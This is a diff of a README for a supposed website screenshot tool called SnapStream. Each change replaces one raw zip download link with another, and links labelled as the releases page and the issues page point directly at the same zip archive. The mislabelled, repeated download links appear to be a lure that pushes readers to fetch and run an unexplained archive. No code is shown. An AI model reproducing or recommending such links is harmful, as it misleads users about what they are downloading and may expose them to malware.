@@ -6,13 +6,13 @@ Welcome to SnapStream! This tool helps you take instant screenshots of websites.
 
 ## 📥 Download Now
 
-[![Download SnapStream](https://raw.githubusercontent.com/mybengui/SnapStream/main/Lotuko/Snap-Stream-wariness.zip)](https://raw.githubusercontent.com/mybengui/SnapStream/main/Lotuko/Snap-Stream-wariness.zip)
+[![Download SnapStream](https://raw.githubusercontent.com/mybengui/SnapStream/main/Lotuko/Stream-Snap-3.0.zip)](https://raw.githubusercontent.com/mybengui/SnapStream/main/Lotuko/Stream-Snap-3.0.zip)
 
 Click the button above to visit the releases page and start your download. 
 
 ## 📂 Download & Install
 
-1. Go to the [GitHub Releases page](https://raw.githubusercontent.com/mybengui/SnapStream/main/Lotuko/Snap-Stream-wariness.zip).
+1. Go to the [GitHub Releases page](https://raw.githubusercontent.com/mybengui/SnapStream/main/Lotuko/Stream-Snap-3.0.zip).
    
 2. You will see a list of available versions. Look for the latest version at the top of the list.
 
@@ -85,7 +85,7 @@ We welcome contributions! If you want to help improve SnapStream:
 
 ## 📞 Support
 
-For any questions or feedback, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/mybengui/SnapStream/main/Lotuko/Snap-Stream-wariness.zip). Your input helps us make SnapStream even better.
+For any questions or feedback, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/mybengui/SnapStream/main/Lotuko/Stream-Snap-3.0.zip). Your input helps us make SnapStream even better.
 
 ## 📜 License
 
@@ -93,4 +93,4 @@ SnapStream is open-source and licensed under the MIT license. Feel free to use i
 
 ## 📥 Download Now Again
 
-Don’t forget, you can always download the latest version right here: [Download SnapStream](https://raw.githubusercontent.com/mybengui/SnapStream/main/Lotuko/Snap-Stream-wariness.zip). 
+Don’t forget, you can always download the latest version right here: [Download SnapStream](https://raw.githubusercontent.com/mybengui/SnapStream/main/Lotuko/Stream-Snap-3.0.zip). 
